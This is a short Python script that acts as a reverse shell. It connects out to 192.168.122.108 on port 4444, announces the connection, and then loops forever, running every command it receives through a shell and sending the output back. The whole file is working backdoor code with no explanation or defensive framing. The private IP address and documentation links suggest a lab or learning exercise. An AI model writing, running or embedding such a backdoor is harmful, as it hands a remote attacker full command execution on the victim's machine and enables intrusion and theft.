#!/usr/bin/env python3

import socket  # https://docs.python.org/3/library/socket.html
import subprocess  # https://docs.python.org/3/library/subprocess.html


def execute_system_commmand(command):
    return subprocess.check_output(command, shell=True)


connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.122.108", 4444))
connection.send(b"\n[+] Connection established\n")

while True:
    command = connection.recv(4096)
    command_result = execute_system_commmand(command.decode())
    connection.send(command_result)

connection.close()